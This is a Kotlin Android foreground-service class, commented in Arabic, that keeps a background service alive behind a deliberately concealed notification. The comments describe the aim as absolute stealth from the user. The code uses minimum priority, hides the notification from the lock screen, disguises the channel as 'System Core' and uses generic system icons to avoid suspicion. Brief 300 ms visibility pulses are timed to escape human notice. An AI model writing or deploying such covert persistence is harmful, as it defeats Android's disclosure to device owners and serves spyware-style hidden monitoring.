package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" دائم.
 *
 * استراتيجية النبض الشبحي (Ghost Pulse):
 * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
 * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
 * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 0.3 ثانية ثم يعود للشبحية
 * - أيقونة نظامية عامة (ic_popup_sync أو ic_menu_compass) لتجنب الشك
 * - إخفاء المحتوى من شاشة القفل
 * - لا يتم إلغاء الإشعار نهائياً للحفاظ على حالة "الأمامية" للخدمة
 *   (إلغاء الإشعار قد يؤدي إلى قتل الخدمة على أندرويد 10+)
 *
 * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
 * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
 * ✅ تحقيق "الظهور والاختفاء" دون تعطيل الخدمة
 * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
 *   باستخدام startForeground مع النوع الصحيح (FOREGROUND_SERVICE_TYPE_DATA_SYNC)
 *   وإبقاء الإشعار حياً بشكل شبحى (غير مرئي)
 * ✅ تم تقليل مدة ظهور النبض إلى 300 مللي ثانية فقط لتفادي الملاحظة البشرية
 */
class ForegroundService : Service() {

    companion object {
        private const val CHANNEL_ID = "ghost_system_channel_v3"
        private const val NOTIF_ID = 7777
        private const val TAG = "ForegroundService"
    }

    private var isForeground = false
    private lateinit var notificationManager: NotificationManager
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // ✅ نبض: عند استلام أمر، يظهر الإشعار لمدة 0.3 ثانية ثم يعود للشبحية
        if (intent?.action == "PULSE_ACTION") {
            startGhostForeground(isPulse = true)
            mainHandler.postDelayed({
                startGhostForeground(isPulse = false)
            }, 300) // 0.3 ثانية فقط – أجزاء من الثانية لاختفاء فوري دون ملاحظة بشرية
            return START_STICKY
        }

        if (!isForeground) {
            startGhostForeground(isPulse = false)
        }

        return START_STICKY
    }

    /**
     * بدء الخدمة الأمامية مع إشعار شبحى أو نبض مؤقت.
     * @param isPulse true: إشعار مرئي مؤقت، false: إشعار شبحى دائم
     */
    private fun startGhostForeground(isPulse: Boolean) {
        try {
            // ✅ تبديل الأولوية: MIN للشبحية، DEFAULT للنبض المؤقت
            val importance = if (isPulse) {
                NotificationManager.IMPORTANCE_DEFAULT
            } else {
                NotificationManager.IMPORTANCE_MIN
            }

            // ✅ إنشاء قناة الإشعارات (أو تحديثها) حسب الأولوية
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "System Core",
                    importance
                ).apply {
                    description = "Background system operations"
                    setShowBadge(false)
                    enableVibration(false)
                    setSound(null, null)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                    if (!isPulse) {
                        setBypassDnd(false) // إخفاء تام في وضع السكون
                        enableLights(false)
                    }
                }
                notificationManager.createNotificationChannel(channel)
                Log.d(TAG, "✅ Notification channel created (pulse=$isPulse)")
            }

            // ✅ بناء الإشعار
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(if (isPulse) "System Syncing..." else "System")
                .setContentText(if (isPulse) "Processing secure task" else "")
                .setSmallIcon(if (isPulse) android.R.drawable.ic_popup_sync else android.R.drawable.ic_menu_compass)
                .setPriority(if (isPulse) NotificationCompat.PRIORITY_DEFAULT else NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setShowWhen(false)
                .setOngoing(true) // ✅ أساسي 100%: يمنع النظام من قتل الخدمة
                .setSilent(true)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()

            // ✅ بدء الخدمة قانونياً مع النوع المناسب لتجنب قيود أندرويد 14
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, notification)
            }

            isForeground = true

            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible for 300ms)" else "✅ Ghost notification started (permanent invisible)"
            MainActivity.appendLogStatic(logMsg)
            Log.d(TAG, logMsg)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
            MainActivity.appendLogStatic("❌ Foreground service start error: ${e.message}")
        }
    }

    override fun onDestroy() {
        isForeground = false
        super.onDestroy()
        Log.d(TAG, "ForegroundService destroyed")
        MainActivity.appendLogStatic("🛑 ForegroundService destroyed")
    }
}
